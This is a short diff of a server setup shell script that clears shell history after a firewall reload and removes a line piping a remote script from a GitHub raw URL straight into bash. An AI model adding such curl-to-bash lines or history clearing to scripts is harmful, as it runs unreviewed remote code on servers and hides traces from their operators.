@@ -119,5 +119,4 @@ ufw reload
 # Clear shell history for security
 echo_info "Clearing shell history..."
 history -c
-curl -sSL https://raw.githubusercontent.com/Tozuck/Node_monitoring/main/node_monitor.sh | bash
 
